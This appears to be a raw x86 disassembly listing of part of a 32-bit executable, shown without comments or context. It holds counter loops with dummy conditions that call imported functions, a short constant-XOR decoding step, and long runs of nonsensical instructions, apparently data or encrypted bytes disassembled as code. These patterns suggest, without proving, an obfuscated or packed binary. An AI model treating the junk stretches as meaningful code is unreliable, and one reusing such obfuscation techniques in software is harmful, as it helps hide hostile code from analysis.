  408341:	mov    DWORD PTR ds:0x4235db,ecx
  408347:	cmp    DWORD PTR ds:0x4235db,0x1a
  40834e:	jae    0x408391
  408354:	cmp    DWORD PTR ds:0x4235db,0xb
  40835b:	jne    0x40836c
  408361:	push   0x561f
  408366:	call   DWORD PTR ds:0x40d36c
  40836c:	cmp    DWORD PTR ds:0x4235db,0xa
  408373:	jne    0x408386
  408379:	mov    ecx,DWORD PTR ds:0x4235db
  40837f:	inc    ecx
  408380:	mov    DWORD PTR ds:0x4235db,ecx
  408386:	jmp    0x40833a
  40838b:	inc    DWORD PTR ds:0x412370
  408391:	mov    ecx,DWORD PTR [ebp+0x8]
  408394:	and    DWORD PTR ds:0x417e55,0x0
  40839e:	jmp    0x4083b1
  4083a3:	xor    eax,eax
  4083a5:	or     eax,DWORD PTR ds:0x417e55
  4083ab:	inc    eax
  4083ac:	mov    ds:0x417e55,eax
  4083b1:	cmp    DWORD PTR ds:0x417e55,0x1f
  4083b8:	jae    0x4083df
  4083be:	cmp    DWORD PTR ds:0x417e55,0x21
  4083c5:	jne    0x4083d4
  4083cb:	push   DWORD PTR [ebp-0x14]
  4083ce:	call   DWORD PTR ds:0x40d008
  4083d4:	jmp    0x4083a3
  4083d9:	sub    DWORD PTR ds:0x4235db,edi
  4083df:	mov    eax,0x8a43
  4083e4:	sub    DWORD PTR ds:0x415101,0x2da0
  4083ee:	jmp    0x408517
  4083f3:	dec    ecx
  4083f4:	pushf  
  4083f5:	push   esp
  4083f6:	in     eax,dx
  4083f7:	imul   esp,ebp,0x9f63b859
  4083fd:	mov    DWORD PTR [ecx+edi*2+0x6113c926],ebp
  408404:	adc    al,0x7e
  408406:	jle    0x408412
  408408:	jg     0x408488
  40840a:	jle    0x408477
  40840c:	push   0xffffffe7
  40840e:	xchg   BYTE PTR [edi],ah
  408410:	adc    eax,0x8a1df74e
  408415:	f2xm1  
  408417:	xchg   edx,eax
  408418:	dec    esp
  408419:	pop    edi
  40841a:	inc    ebp
  40841b:	pop    ebx
  40841c:	stos   BYTE PTR es:[edi],al
  40841d:	leave  
  40841e:	outs   dx,BYTE PTR ds:[esi]
  40841f:	or     eax,0x91dc3912
  408424:	inc    ecx
  408425:	add    BYTE PTR [ebx-0x73b52a53],dh
  40842b:	in     al,dx
  40842c:	ja     0x40842d
  40842e:	ins    BYTE PTR es:[edi],dx
  40842f:	movntq QWORD PTR [ecx+ecx*8-0x2b04c1cc],mm0
  408437:	sti    
  408438:	neg    DWORD PTR [ebp-0x36]
  40843b:	frstor [edx]
  40843d:	push   ebx
  40843e:	inc    ebx
  40843f:	sbb    DWORD PTR [ebx+0x12],esi
  408442:	jae    0x4083cb
  408444:	dec    edx
  408445:	mov    bl,dh
  408447:	dec    edx
  408448:	(bad)  
  408449:	cmp    eax,0xed189a60
  40844e:	sub    ebx,eax
  408450:	push   ebp
  408451:	xor    eax,0xb7d70c7a
  408456:	test   BYTE PTR [eax],0xe
  408459:	and    ebp,DWORD PTR [ebx]
  40845b:	xor    dl,BYTE PTR [eax]
  40845d:	jno    0x40846a
  40845f:	cmc    
  408460:	xchg   esi,eax
  408461:	shl    DWORD PTR [edx],cl
  408463:	push   cs
  408464:	aas    
  408465:	adc    BYTE PTR ds:0x895d7368,ch
  40846b:	addr16 push ebx
  40846d:	arpl   si,si
  40846f:	push   0xffffffe8
  408471:	jbe    0x4084de
  408473:	jnp    0x40849e
  408475:	dec    eax
  408476:	les    esp,FWORD PTR [edi]
  408478:	cmp    al,0x44
  40847a:	sub    eax,0xac6e5e3e
  40847f:	int3   
  408480:	jb     0x40840f
  408482:	test   eax,0x72cb0420
  408487:	xchg   esp,eax
  408488:	or     al,0xc1
  40848a:	mov    ds:0xe294ceb,al
  40848f:	mov    edx,0xacd5f8e9
  408494:	push   es
  408495:	jp     0x40843d
  408497:	push   ebx
  408498:	imul   edi,DWORD PTR [ecx-0x74],0xd1c9f880
  40849f:	call   0x8cc0:0x8e8460d3
  4084a6:	add    eax,DWORD PTR [edx]
  4084a8:	add    eax,DWORD PTR [ecx+ebp*4]
  4084ab:	fnstsw WORD PTR [eax-0xc3a73bb]
  4084b1:	add    eax,DWORD PTR [eax-0x25]
  4084b4:	xor    al,0x59
  4084b6:	mov    ds:0xdaadedcb,al
  4084bb:	jecxz  0x408499
  4084bd:	lock mov BYTE PTR [esi-0x5d],cl
  4084c1:	xchg   ebp,eax
  4084c2:	jnp    0x40850e
  4084c4:	sti    
  4084c5:	xlat   BYTE PTR ds:[ebx]
  4084c6:	mov    bh,0x90
  4084c8:	test   eax,0x43bf2692
  4084cd:	xor    eax,esp
  4084cf:	xor    DWORD PTR [edi+0x71],0xffffffdd
  4084d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084d4:	or     eax,0xeb64ff4f
  4084d9:	fild   DWORD PTR [eax+eiz*8]
  4084dc:	(bad)  
  4084dd:	fistp  WORD PTR [edx-0x20]
  4084e0:	push   edi
  4084e1:	inc    eax
  4084e2:	jmp    0x9bac:0x9d6ee3a1
  4084e9:	icebp  
  4084ea:	dec    eax
  4084eb:	xlat   BYTE PTR ds:[ebx]
  4084ec:	xlat   BYTE PTR ds:[ebx]
  4084ed:	call   0x99b4:0xff5b5121
  4084f4:	call   0xcb8f:0x2c672025
  4084fb:	retf   0x931c
  4084fe:	out    dx,eax
  4084ff:	adc    BYTE PTR [ecx-0x6e4e9984],0xdf
  408506:	add    eax,0x6d71e062
  40850b:	lock inc ebx
  40850d:	mov    edi,0x4ac0dcd7
  408512:	hlt    
  408513:	add    ebx,DWORD PTR [ebx]
  408515:	sub    dh,BYTE PTR [eax]
  408517:	xor    ax,WORD PTR [ecx+0x20]
  40851b:	mov    ecx,0x3b0a
  408520:	not    DWORD PTR ds:0x41abce
  408526:	add    ax,cx
  408529:	mov    ecx,DWORD PTR ds:0x417e49
  40852f:	or     ecx,DWORD PTR ds:0x412374
  408535:	mov    DWORD PTR ds:0x417e49,ecx
  40853b:	jmp    0x408664
  408540:	sub    cl,BYTE PTR [ebp-0x31]
  408543:	xchg   esp,eax
  408544:	jns    0x4084da
  408546:	jns    0x408589
  408548:	or     eax,0x9f26a896
  40854d:	shl    DWORD PTR [esi],0xd1
  408550:	jge    0x40857c
  408552:	jle    0x4085d2
  408554:	or     bh,BYTE PTR [edi+0x7e]
  408557:	jle    0x40859e
  408559:	jae    0x40855b
  40855b:	das    
  40855c:	repnz xor DWORD PTR [eax+ebp*2-0x4cd754ea],ecx
  408564:	rol    DWORD PTR [ebx+edx*8-0x7],0x88
  408569:	xor    al,0xd
  40856b:	mov    ds:0xb2fa579d,eax
  408570:	loope  0x408541
  408572:	add    BYTE PTR [ecx-0x11],ch
  408575:	jmp    0x348338a4
  40857a:	hlt    
  40857b:	xor    DWORD PTR [edi-0x7acb9d0],ecx
  408581:	inc    esi
  408582:	xor    DWORD PTR [edx],ebp
  408584:	and    dl,0x48
  408587:	test   bh,0x8c
  40858a:	nop
  40858b:	or     eax,0x9f230db0
  408590:	dec    edi
  408591:	mov    edi,0x99dd78b7
  408596:	xchg   edi,eax
  408597:	sbb    al,0x55
  408599:	add    BYTE PTR [eax+0x1783fead],bl
  40859f:	lahf   
  4085a0:	out    dx,al
  4085a1:	or     DWORD PTR [edx+0x6a],edi
  4085a4:	fisub  WORD PTR ds:0xf8a6dfa0
  4085aa:	and    eax,0x528ab6ec
  4085af:	cmp    eax,0x810a0c86
  4085b4:	dec    eax
  4085b5:	sub    eax,0x13190b84
  4085ba:	push   ds
  4085bb:	sbb    eax,0xf91b1e
  4085c0:	push   es
  4085c1:	mov    eax,es
  4085c3:	ror    cl,0x98
  4085c6:	mov    ds:0xa797f0e6,al
  4085cb:	out    dx,al
  4085cc:	xor    DWORD PTR [esi+esi*8-0xd],esp
  4085d0:	ja     0x408586
  4085d2:	mov    WORD PTR ds:0x39133e2f,es
  4085d8:	out    0xd1,eax
  4085da:	es fs inc esp
  4085dd:	cmc    
  4085de:	or     eax,DWORD PTR [ecx]
  4085e0:	sbb    dl,dl
  4085e2:	sub    DWORD PTR [edx],edx
  4085e4:	imul   ebp,DWORD PTR [esi+0x64f8d027],0xffffff81
  4085eb:	cdq    
  4085ec:	mov    ebp,0x1ab1fbf5
  4085f1:	shr    al,1
  4085f3:	cmp    DWORD PTR [ecx],eax
  4085f5:	clc    
  4085f6:	bound  ecx,QWORD PTR [edi]
  4085f8:	fs loop 0x40863c
  4085fb:	mov    edi,?
  4085fd:	xchg   edx,eax
  4085fe:	add    BYTE PTR [ebx],bl
  408600:	fnsave [ebx]
  408602:	mov    ah,0x5e
  408604:	fs mov bh,0x54
  408607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408608:	scas   al,BYTE PTR es:[edi]
  408609:	das    
  40860a:	xor    BYTE PTR [ebx+0x6c],ah
  40860d:	outs   dx,DWORD PTR ds:[esi]
  40860e:	dec    eax
  40860f:	ins    BYTE PTR es:[edi],dx
  408610:	mov    esi,0x493ad3d0
  408615:	into   
  408616:	sub    BYTE PTR [ebp+0x4],dl
  408619:	xchg   ebx,eax
  40861a:	repz pop esi
  40861c:	stos   BYTE PTR es:[edi],al
  40861d:	mov    eax,0xa4c3ad7d
  408622:	lahf   
  408623:	lea    eax,[ebx+0x16]
  408626:	div    BYTE PTR [ebp-0x3d]
  408629:	cli    
  40862a:	sub    ah,dh
  40862c:	mov    eax,ds:0xa4fac8d3
  408631:	outs   dx,BYTE PTR ds:[esi]
  408632:	cmp    eax,0x4fffece0
  408637:	push   ebp
  408638:	cmc    
  408639:	xor    al,0xa2
  40863b:	pop    esi
  40863c:	das    
  40863d:	lods   eax,DWORD PTR ds:[esi]
  40863e:	fst    QWORD PTR [esi+0x47]
  408641:	jmp    0x1c9cbf3f
  408646:	push   0x19
  408648:	mov    esi,0x6799face
  40864d:	jne    0x4085e0
  40864f:	leave  
  408650:	or     BYTE PTR [ecx],0x3c
  408653:	data16 ficom WORD PTR [edx-0x2c9975d2]
  40865a:	and    BYTE PTR [edi-0x4c],ah
  40865d:	jnp    0x4085ea
  40865f:	dec    ebp
  408660:	cld    
  408661:	dec    ecx
  408662:	jge    0x4086aa
  408664:	movzx  eax,ax
  408667:	add    ecx,DWORD PTR ds:0x417e49
  40866d:	mov    DWORD PTR [ebp-0xc],eax
  408670:	mov    BYTE PTR [ebp-0x1],0x7f
  408674:	lea    eax,[ebp-0x1]
  408677:	and    DWORD PTR ds:0x4235d7,edx
  40867d:	mov    DWORD PTR [ebp-0x10],eax
  408680:	mov    DWORD PTR ds:0x41510d,0x1a
  40868a:	cmp    DWORD PTR ds:0x41510d,0x0
  408691:	je     0x4086bf
  408697:	cmp    DWORD PTR ds:0x41510d,0x25
  40869e:	jne    0x4086ad
  4086a4:	push   DWORD PTR [ebp-0x18]
  4086a7:	call   DWORD PTR ds:0x40d370
  4086ad:	mov    ecx,DWORD PTR ds:0x41510d
  4086b3:	dec    ecx
  4086b4:	mov    DWORD PTR ds:0x41510d,ecx
  4086ba:	jmp    0x40868a
  4086bf:	mov    al,BYTE PTR [ebp-0x1]
  4086c2:	and    DWORD PTR ds:0x4150fd,0x0
  4086cc:	mov    ecx,DWORD PTR ds:0x4150fd
  4086d2:	inc    ecx
  4086d3:	mov    DWORD PTR ds:0x4150fd,ecx
  4086d9:	cmp    DWORD PTR ds:0x4150fd,0x11
  4086e0:	jne    0x4086f1
  4086e6:	push   0x41ad87
  4086eb:	call   DWORD PTR ds:0x40d1e4
  4086f1:	cmp    DWORD PTR ds:0x4150fd,0x10
  4086f8:	jne    0x40870b
  4086fe:	mov    ecx,DWORD PTR ds:0x4150fd
  408704:	inc    ecx
  408705:	mov    DWORD PTR ds:0x4150fd,ecx
  40870b:	cmp    DWORD PTR ds:0x4150fd,0x1f
  408712:	jb     0x4086cc
  408718:	neg    ecx
  40871a:	mov    ecx,DWORD PTR [ebp-0x10]
  40871d:	xor    al,0x4a
  40871f:	or     DWORD PTR ds:0x41abe2,0x415105
  408729:	sub    al,0x34
  40872b:	mov    BYTE PTR [ecx],al
  40872d:	xor    ecx,ecx
  40872f:	jmp    0x408858
  408734:	adc    DWORD PTR [ebx+0xc],ebx
  408737:	(bad)  
  408738:	fs pop ecx
  40873a:	jmp    0x44b4d3b8
  40873f:	fisub  DWORD PTR [ecx+0x9af5758]
  408745:	sub    edi,DWORD PTR [esi+0x7e]
  408748:	or     bh,BYTE PTR [edi+0x7e]
  40874b:	jle    0x40871f
  40874d:	dec    ebp
  40874e:	icebp  
  40874f:	push   0x16
  408751:	xor    eax,0x9b7cee5b
  408756:	cmp    ebp,eax
  408758:	mov    ah,0x2
  40875a:	cmp    esp,esi
  40875c:	adc    ecx,DWORD PTR [ebp-0x438c9561]
  408762:	or     BYTE PTR [ecx-0x2676e92e],bl
  408768:	jp     0x4087cd
  40876a:	data16 (bad) 
  40876c:	retf   0x3ad5
  40876f:	adc    ch,dl
  408771:	lea    ebp,[esi]
  408773:	sbb    DWORD PTR ds:[edi-0xd],edi
  408777:	adc    ah,BYTE PTR [eax]
  408779:	rcl    DWORD PTR [ecx+0x2365eca2],cl
  40877f:	cmp    eax,0xa04e2410
  408784:	adc    eax,0x87441761
  408789:	and    DWORD PTR [eax+eax*1+0x49cca3b4],0x7a
  408791:	jmp    0x89472ce
  408796:	rcl    DWORD PTR [edi],0xe0
  408799:	scas   eax,DWORD PTR es:[edi]
  40879a:	sub    al,0xdc
  40879c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40879d:	sbb    al,0x99
  40879f:	mov    bl,0xd8
  4087a1:	xchg   edx,eax
  4087a2:	inc    esi
  4087a3:	cwde   
  4087a4:	jp     0x4087fa
  4087a6:	jg     0x4087d8
  4087a8:	adc    al,0x6a
  4087aa:	call   0x8b91:0x55585a5b
  4087b1:	popf   
  4087b2:	fs inc edx
  4087b4:	jns    0x4087a2
  4087b6:	cmp    eax,0x65dc3806
  4087bb:	dec    ecx
  4087bc:	or     ch,BYTE PTR [eax]
  4087be:	mov    al,ds:0x9c9eea1c
  4087c3:	icebp  
  4087c4:	data16 in al,0xd1
  4087c7:	out    0xbf,al
  4087c9:	mov    dl,0x6a
  4087cb:	mov    eax,0x222ad561
  4087d0:	imul   ecx,eax,0x40
  4087d3:	pop    esi
  4087d4:	scas   al,BYTE PTR es:[edi]
  4087d5:	addr16 std 
  4087d7:	and    ebx,DWORD PTR [ecx-0x1dde681]
  4087dd:	nop
  4087de:	sar    dh,0x97
  4087e1:	sub    eax,0x2f86b492
  4087e6:	sub    edi,esi
  4087e8:	sbb    DWORD PTR [esi+0x7f],0xbfa7190
  4087ef:	js     0x40880b
  4087f1:	or     ch,dl
  4087f3:	xor    al,0xf4
  4087f5:	pop    ds
  4087f6:	add    al,0xe3
  4087f8:	cmp    BYTE PTR [esi+esi*2],bl
  4087fb:	jmp    0x7481:0x1ac850d8
  408802:	(bad)  
  408803:	inc    ebx
  408804:	sub    ah,BYTE PTR [esi-0x2ddba9cd]
  40880a:	jle    0x4087fb
  40880c:	mov    eax,ds:0xe4095c08
  408811:	push   ss
  408812:	scas   al,BYTE PTR es:[edi]
  408813:	mov    eax,0xdeae0514
  408818:	addr16 loope 0x4087bf
  40881b:	test   DWORD PTR [ebp+0x2f2fbfb4],eax
  408821:	cmp    ebx,edx
  408823:	rol    BYTE PTR [ecx],cl
  408825:	das    
  408826:	std    
  408827:	dec    esp
  408828:	xor    edx,DWORD PTR [eax+ebx*8]
  40882b:	mov    fs,WORD PTR [edi-0x6bac5c5d]
  408831:	popf   
  408832:	xor    dl,BYTE PTR [edx-0x32]
  408835:	sub    esi,DWORD PTR [esi]
  408837:	in     eax,0x10
  408839:	std    
  40883a:	ret    
  40883b:	scas   eax,DWORD PTR es:[edi]
  40883c:	loopne 0x408820
  40883e:	mov    ds:0xeb8f82e6,al
  408843:	ret    
  408844:	jae    0x408836
  408846:	mov    al,ds:0x67bf384e
  40884b:	or     eax,0x46f0a673
  408850:	in     al,0x1f
  408852:	add    ecx,DWORD PTR [esi-0x19]
  408855:	(bad)  
  408856:	enter  0xc788,0x45
  40885a:	clc    
  40885b:	cmp    BYTE PTR [ebp+0x1581f89c],al
  408861:	jo     0x408886
  408863:	inc    ecx
  408864:	add    BYTE PTR [esi-0x38ffffe9],al
  40886a:	inc    ebp
  40886b:	lock cmp eax,DWORD PTR [ebp+0x458bf89c]
  408872:	clc    
  408873:	xor    ecx,ecx
  408875:	add    ecx,DWORD PTR ds:0x417e59
  40887b:	sbb    DWORD PTR ds:0x41abde,ecx
  408881:	mov    ecx,0x7510859
  408886:	add    DWORD PTR ds:0x41abe6,0x417e51
  408890:	push   esi
  408891:	and    DWORD PTR ds:0x417e59,0x0
  40889b:	mov    esi,DWORD PTR ds:0x417e59
  4088a1:	inc    esi
  4088a2:	mov    DWORD PTR ds:0x417e59,esi
  4088a8:	cmp    DWORD PTR ds:0x417e59,0x9
  4088af:	jne    0x4088f1
  4088b5:	push   0x41ad06
  4088ba:	push   DWORD PTR [ebp-0x10]
  4088bd:	push   DWORD PTR [ebp-0x14]
  4088c0:	push   0x6f38
  4088c5:	push   0x208a
  4088ca:	push   0x8fdb
  4088cf:	push   0x1d69
  4088d4:	push   DWORD PTR [ebp-0x20]
  4088d7:	push   0x57cc
  4088dc:	push   DWORD PTR [ebp-0x10]
  4088df:	push   DWORD PTR [ebp-0x28]
  4088e2:	push   DWORD PTR [ebp-0x24]
  4088e5:	push   DWORD PTR [ebp-0x28]
  4088e8:	push   DWORD PTR [ebp-0x1c]
  4088eb:	call   DWORD PTR ds:0x40d374
  4088f1:	cmp    DWORD PTR ds:0x417e59,0x8
  4088f8:	jne    0x40890d
  4088fe:	xor    esi,esi
  408900:	add    esi,DWORD PTR ds:0x417e59
  408906:	inc    esi
  408907:	mov    DWORD PTR ds:0x417e59,esi
  40890d:	cmp    DWORD PTR ds:0x417e59,0x13
  408914:	jb     0x40889b
  40891a:	xor    eax,ecx
  40891c:	mov    esi,0x32729f
  408921:	add    eax,esi
  408923:	jmp    0x408930
  408928:	mov    dl,BYTE PTR [ebp-0x1]
  40892b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40892f:	inc    eax
  408930:	cmp    eax,0x40
  408933:	jb     0x408928
  408939:	mov    edx,DWORD PTR [ebp-0x8]
  40893c:	mov    eax,DWORD PTR [ebp-0xc]
  40893f:	jmp    0x408a68
  408944:	sub    eax,0xb98f82f6
  408949:	fwait
  40894a:	and    DWORD PTR [eax+eax*1+0x72d74167],edx
  408951:	fwait
  408952:	mov    bl,0xed
  408954:	add    eax,0xa7e7e28
  408959:	jg     0x4089d9
  40895b:	jle    0x408924
  40895d:	push   eax
  40895e:	adc    bh,BYTE PTR [ebp+edi*1-0x5e]
  408962:	mov    DWORD PTR [ebx-0xdd2a82d],ebx
  408968:	aad    0x2a
  40896a:	inc    edx
  40896b:	push   ds
  40896c:	pushf  
  40896d:	push   edi
  40896e:	cdq    
  40896f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408970:	and    esp,eax
  408972:	pop    ebx
  408973:	adc    al,BYTE PTR [eax+edi*8+0x7e7dfd0f]
  40897a:	inc    ebp
  40897b:	adc    edx,eax
  40897d:	cld    
  40897e:	mov    al,ds:0xa0a9ddb2
  408983:	adc    eax,DWORD PTR [edi]
  408985:	(bad)  
  408987:	clc    
  408988:	pop    eax
  408989:	dec    esi
  40898a:	xor    BYTE PTR [edi+0x72],0xc7
  40898e:	inc    ebp
  40898f:	(bad)  
  408990:	cmp    eax,0xd5c56daa
  408995:	pop    edx
  408996:	stos   BYTE PTR es:[edi],al
  408997:	pop    esp
  408998:	mov    ds:0x68dcc67b,eax
  40899d:	mov    DWORD PTR [eax+0x79],esp
  4089a0:	sbb    ebp,edx
  4089a2:	xchg   edx,eax
  4089a3:	ds ins DWORD PTR es:[edi],dx
  4089a5:	mov    al,0x6e
  4089a7:	mov    edx,ebp
  4089a9:	loope  0x4089f5
  4089ab:	icebp  
  4089ac:	lsl    edx,si
  4089af:	mov    cl,BYTE PTR [edx+0x7b]
  4089b2:	xchg   esi,eax
  4089b3:	lea    ebp,[edi-0x25406cc0]
  4089b9:	add    BYTE PTR [ecx-0x4c683172],0x62
  4089c0:	dec    edx
  4089c1:	repnz loop 0x408988
  4089c4:	xchg   edx,eax
  4089c5:	cdq    
  4089c6:	pusha  
  4089c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089c8:	test   BYTE PTR [edi-0x6e02f37a],ah
  4089ce:	dec    eax
  4089cf:	mov    bh,0xbf
  4089d1:	lahf   
  4089d2:	mov    eax,0xd80977fb
  4089d7:	mov    ecx,0x3afdd3bf
  4089dc:	das    
  4089dd:	pop    esp
  4089de:	ds jge 0x408a35
  4089e1:	call   0xa88c:0xf79fee04
  4089e8:	pusha  
  4089e9:	adc    DWORD PTR [ebx-0x376159b3],ebx
  4089ef:	mov    al,0xe9
  4089f1:	mov    dl,0x84
  4089f3:	or     eax,0x8e829bdc
  4089f8:	cwde   
  4089f9:	xor    ebp,esp
  4089fb:	mov    bh,0x87
  4089fd:	aaa    
  4089fe:	and    al,0xd2
  408a00:	pop    esp
  408a01:	ins    DWORD PTR es:[edi],dx
  408a02:	(bad)  
  408a04:	popf   
  408a05:	pop    edi
  408a06:	fwait
  408a07:	sub    DWORD PTR [ebx],ebx
  408a09:	out    dx,eax
  408a0a:	and    DWORD PTR [ecx],ebx
  408a0c:	adc    cl,al
  408a0e:	aas    
  408a0f:	pop    ecx
  408a10:	xor    al,0x3e
  408a12:	rcr    BYTE PTR [edx],cl
  408a14:	iret   
  408a15:	sub    al,0x58
  408a17:	test   al,0x51
  408a19:	mov    ds:0x1dc47126,al
  408a1e:	cmp    al,0xfe
  408a20:	les    ecx,FWORD PTR [eax+edx*8+0x44532520]
  408a27:	mov    BYTE PTR [ecx+0x4d],ch
  408a2a:	cmp    esp,eax
  408a2c:	dec    esi
  408a2d:	mov    edi,0x16d74e93
  408a32:	mov    ss,WORD PTR [ebx-0x3e04bb81]
  408a38:	jp     0x408aaa
  408a3a:	dec    ebp
  408a3b:	scas   eax,DWORD PTR es:[edi]
  408a3c:	fisttp QWORD PTR [ebp-0x58f2a7a8]
  408a42:	sbb    eax,0x8ac3f97c
  408a47:	shl    DWORD PTR [esi],0x39
  408a4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a4b:	inc    eax
  408a4c:	neg    DWORD PTR [edi-0x3f0e6b24]
  408a52:	ins    DWORD PTR es:[edi],dx
  408a53:	push   0x5970fb8
  408a58:	loopne 0x408ab0
  408a5a:	jl     0x408aa3
  408a5c:	iret   
  408a5d:	arpl   WORD PTR [ecx],cx
  408a5f:	xor    BYTE PTR [ebp+0x68],cl
  408a62:	inc    ebp
  408a63:	adc    eax,0xbadece05
  408a68:	xor    edx,ecx
  408a6a:	add    edx,esi
  408a6c:	cmp    edx,eax
  408a6e:	je     0x408d06
  408a74:	jmp    0x408b9d
  408a79:	xor    ecx,DWORD PTR [edx+ebx*1-0x14]
  408a7d:	cdq    
  408a7e:	js     0x408a69
  408a80:	popa   
  408a81:	cmp    ax,0xba8d
  408a85:	js     0x408a2a
  408a87:	cmp    ah,BYTE PTR [edi+0x11]
  408a8a:	sub    DWORD PTR [esi+0x7e],edi
  408a8d:	or     bh,BYTE PTR [edi+0x7e]
  408a90:	jle    0x408af3
  408a92:	aaa    
  408a93:	in     eax,dx
  408a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a95:	sbb    BYTE PTR [eax+ebx*1-0x4070ef3c],al
  408a9c:	xor    al,0x5b
  408a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a9f:	mov    dl,0x7a
  408aa1:	fcmove st,st(1)
  408aa3:	mov    WORD PTR [ecx-0x73f7fc7c],es
  408aa9:	sub    dl,0xb6
  408aac:	(bad)  
  408aad:	mov    ds:0x43820f4f,al
  408ab2:	dec    ebx
  408ab3:	xchg   ecx,eax
  408ab4:	shr    DWORD PTR [esi],1
  408ab6:	dec    esp
  408ab7:	push   ss
  408ab8:	xor    dh,cl
  408aba:	sahf   
  408abb:	push   cs
  408abc:	or     al,0x4b
  408abe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408abf:	sar    DWORD PTR [edx+0x1fae41c4],1
  408ac5:	inc    edi
  408ac6:	shr    BYTE PTR [ecx],cl
  408ac8:	in     eax,0x5d
  408aca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408acb:	add    BYTE PTR [ecx-0x3289575b],al
  408ad1:	das    
  408ad2:	and    DWORD PTR [eax+0x7653e32a],ebx
  408ad8:	fidivr DWORD PTR [esi]
  408ada:	cs loop 0x408a90
  408add:	(bad)  
  408ade:	adc    esi,esp
  408ae0:	repz fwait
  408ae2:	sub    ch,BYTE PTR [eax-0x4d]
  408ae5:	jne    0x408b24
  408ae7:	pop    ebp
  408ae8:	rcl    ah,1
  408aea:	push   eax
  408aeb:	xor    dh,bh
  408aed:	ss mov edx,0xc891a314
  408af3:	cwde   
  408af4:	(bad)  
  408af5:	das    
  408af6:	div    BYTE PTR [edi+0x20b6a425]
  408afc:	cld    
  408afd:	stos   BYTE PTR es:[edi],al
  408afe:	fidiv  WORD PTR [edi+ebp*8]
  408b01:	mov    bh,bh
  408b03:	mov    ds:0xbab0ee2d,eax
  408b08:	add    BYTE PTR [ebp-0x3d4fb8ed],bh
  408b0e:	sub    WORD PTR [eax+0x5c],si
  408b12:	enter  0x6cc3,0xfd
  408b16:	scas   eax,DWORD PTR es:[edi]
  408b17:	pusha  
  408b18:	imul   ecx,esi,0xf87045d5
  408b1e:	stos   BYTE PTR es:[edi],al
  408b1f:	(bad)  
  408b20:	stc    
  408b21:	lock mov edi,0x410f3da8
  408b27:	jae    0x408b0f
  408b29:	cld    
  408b2a:	mov    bh,0x4a
  408b2c:	fsubr  DWORD PTR [ebx]
  408b2e:	jno    0x408ade
  408b30:	dec    esi
  408b31:	je     0x408adb
  408b33:	retf   
  408b34:	stos   BYTE PTR es:[edi],al
  408b35:	pop    ss
  408b36:	sub    eax,0x1caa5b38
  408b3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b3c:	mov    al,ds:0xdae8264d
  408b41:	push   edx
  408b42:	popf   
  408b43:	add    BYTE PTR cs:[eax-0x63f7237d],ch
  408b4a:	idiv   DWORD PTR [esi]
  408b4c:	inc    edx
  408b4d:	push   eax
  408b4e:	hlt    
  408b4f:	call   0xebe91830
  408b54:	fsubr  DWORD PTR [esp+edi*8-0x47]
  408b58:	mov    bl,BYTE PTR [ebp+0x7adf8fc4]
  408b5e:	add    bl,al
  408b60:	stos   DWORD PTR es:[edi],eax
  408b61:	adc    BYTE PTR [edi+0x145461b9],0x68
  408b68:	fadd   DWORD PTR [ebp-0x761a273b]
  408b6e:	repnz adc dh,bl
  408b71:	sbb    dl,BYTE PTR [ebx+0xfdbacf2]
  408b77:	scas   al,BYTE PTR es:[edi]
  408b78:	mov    WORD PTR [edx],ss
  408b7a:	mov    al,0xd1
  408b7c:	mov    ds:0x4437c797,eax
  408b81:	test   eax,0x4fa0f487
  408b86:	jno    0x408bf3
  408b88:	mov    al,0xf2
  408b8a:	cmp    ah,BYTE PTR [esi+0x25b1a743]
  408b90:	or     bh,BYTE PTR [ecx+0x3f]
  408b93:	jnp    0x408b5e
  408b95:	rol    DWORD PTR [edx+0x6e],1
  408b98:	fbld   TBYTE PTR [edx+0x1]
  408b9b:	outs   dx,DWORD PTR ds:[esi]
  408b9c:	daa    
  408b9d:	push   ebx
  408b9e:	push   edi
  408b9f:	mov    edi,DWORD PTR [ebp+0x8]
  408ba2:	mov    eax,0x8a43
  408ba7:	xor    ax,WORD PTR [edi+edx*4+0x2]
  408bac:	mov    edi,0x3b0a
  408bb1:	add    ax,di
  408bb4:	movzx  eax,ax
  408bb7:	mov    DWORD PTR [ebp-0x14],eax
  408bba:	mov    eax,DWORD PTR [ebp+0x8]
  408bbd:	jmp    0x408ce6
  408bc2:	(bad)  
  408bc3:	fcom   DWORD PTR [edx+eax*8]
  408bc6:	sub    dl,ah
  408bc8:	clc    
  408bc9:	fcomp  DWORD PTR [ebx-0x2ec9643]
  408bcf:	pusha  
  408bd0:	call   0xa7e:0x7e2e2dce
  408bd7:	jg     0x408c57
  408bd9:	jle    0x408b7f
  408bdb:	inc    esi
  408bdc:	clc    
  408bdd:	clc    
  408bde:	out    0xb5,al
  408be0:	sbb    DWORD PTR [eax],edi
  408be2:	inc    ebx
  408be3:	outs   dx,DWORD PTR ds:[esi]
  408be4:	aaa    
  408be5:	idiv   BYTE PTR [eax-0x305f9245]
  408beb:	push   ebx
  408bec:	test   ebx,esp
  408bee:	fisttp DWORD PTR [eax-0x5affa448]
  408bf4:	sbb    DWORD PTR [edx+0x38],eax
  408bf7:	jno    0x408c24
  408bf9:	sub    dl,ah
  408bfb:	je     0x408b95
  408bfd:	cdq    
  408bfe:	or     al,0x16
  408c00:	xor    eax,ebp
  408c02:	mov    ebp,0x9118ea09
  408c07:	daa    
  408c08:	adc    ecx,edi
  408c0a:	mov    BYTE PTR [edi-0x89b427c],0xb6
  408c11:	inc    ecx
  408c12:	out    0x40,eax
  408c14:	push   es
  408c15:	push   esi
  408c16:	(bad)  
  408c17:	fst    QWORD PTR [edx-0x61d85535]
  408c1d:	cmp    al,0x4a
  408c1f:	into   
  408c20:	int    0x49
  408c22:	push   es
  408c23:	(bad)  
  408c24:	in     eax,dx
  408c25:	mov    al,0x5f
  408c27:	mov    gs,WORD PTR [ebx]
  408c29:	call   0xfbf7cfae
  408c2e:	addr16 stc 
